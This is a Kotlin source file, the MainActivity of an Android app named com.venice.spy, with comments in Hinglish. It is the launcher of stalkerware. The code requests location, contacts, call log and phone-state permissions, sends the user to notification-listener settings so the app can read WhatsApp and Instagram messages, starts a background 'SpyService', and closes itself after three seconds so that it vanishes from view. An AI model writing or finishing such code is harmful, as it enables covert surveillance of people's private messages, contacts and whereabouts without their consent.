package com.venice.spy

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val perms = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)

        val need = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (need.isNotEmpty()) requestPermissions(need.toTypedArray(), 1)

        // Notification access (WhatsApp/Insta messages ke liye)
        if (!isNotifAccess()) {
            try { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
            catch (e: Exception) {}
        }

        // Service start
        val si = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(si) else startService(si)

        // 3 second baad gayab ho jao
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 3000)
    }

    private fun isNotifAccess(): Boolean {
        val flat = Settings.Secure.getString(contentResolver,
            "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }
}